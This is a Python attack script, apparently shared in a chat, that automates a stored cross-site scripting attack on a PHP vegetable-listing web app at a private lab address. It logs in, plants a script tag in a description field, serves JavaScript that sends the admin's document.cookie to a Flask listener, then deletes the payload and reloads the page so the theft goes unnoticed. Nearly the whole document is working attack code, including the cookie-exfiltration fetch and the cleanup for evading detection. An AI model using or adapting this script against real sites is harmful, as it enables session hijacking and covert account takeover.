[8:18 PM] Theodorou Charalampos

from flask import Flask, request

from bs4 import BeautifulSoup

import requests

 

#1. we want to grab the admin cookie whenever he/she logins

#2. we want to delete the payload after that to avoid detection

#3. when the payload will get executed we will delete it and then refresh the page so the admin wont notice anything strange.

 

 

 

#1 ----------------------------Login into the application-------------------------------------

 

#1.1 Create a session

session = requests.Session()

 



#1.2passing it though burp proxy

proxies = {

    'http': 'http://localhost:8080',

    'https': 'http://localhost:8080'

}

 

#1.3 Set the proxy configuration for the session

session.proxies = proxies

 

#1.4 Define the request headers

headers = {

    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',

    'Accept-Language': 'en-US,en;q=0.5',

    'Accept-Encoding': 'gzip, deflate',

    'Content-Type': 'application/x-www-form-urlencoded',

    'Origin': 'http://10.0.2.4',

    'Referer': 'http://10.0.2.4/login.php',

    'Upgrade-Insecure-Requests': '1'

}

 



#1.5 Define the login request data

data = {

    'username': 'tester',

    'password': 'tester'

}

 

#1.6 Make the login request

url = 'http://10.0.2.4/login.php'

response = session.post(url, headers=headers, data=data)

 



#2 ----------------------------storing the xss payload!----------------------------

 

#2.1 Define the data that will be send and stored.

data = {

    'name': 'test2',

    'description': '</td><script src=http://10.0.2.15/payload.js></script><td>This might be a problem',

    'nutrition': 'test2'

}

 

# 2.2 Make the creation request

url = 'http://10.0.2.4/addVegetable.php'

response = session.post(url, headers=headers, data=data)

 

 

#3 ----------------------------We use a flask web server to serve the payload and capture the cookie----------------------------

app = Flask(__name__)

 

#3.1 Serve the JavaScript file !note the location.reload this will reload the page after 2 sec!

@app.route('/payload.js')

def serve_script():

    return """fetch('http://10.0.2.15/CookieEater', {

          method: 'POST',

          body: document.cookie})

          .then(response => response.text())

          .then(responseData => console.log('Response:', responseData))

  .catch(error => console.error('Error making POST request:', error));

  setTimeout(function() {

  // Refresh the page

  location.reload();

}, 2000);"""    


#3.2 Listen for the POST request that contain the cookie

@app.route('/CookieEater', methods=['POST'])

def handle_post_request():

    cookie_value = request.data.decode('utf-8')


#3.3 Getting all the stored data 

    url = 'http://10.0.2.4/vegetables.php'

    response = session.get(url, headers=headers)

 

#3.4 Extract the ID of our stored payload

    soup = BeautifulSoup(response.text, 'html.parser')

    rows = soup.find_all('tr')

    for row in rows:

        columns = row.find_all('td')

        if len(columns) >= 2 and columns[1].text.strip() == 'test2':

            payload_id = columns[0].text.strip()

            #print("ID:", payload_id)

            break

 

#3.5 Check if the cookie value is not the same as the one we aleady have

    if cookie_value != session.cookies.get('PHPSESSID'):

        print('Received cookie value:', cookie_value)

#3.6 If we got a different coookie then delete the stored payload

        data = {"id":payload_id}

        url = 'http://10.0.2.4/deleteVegetable.php'

        response = session.post(url, headers=headers, data=data)

    return 'POST request received'

 

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=80)
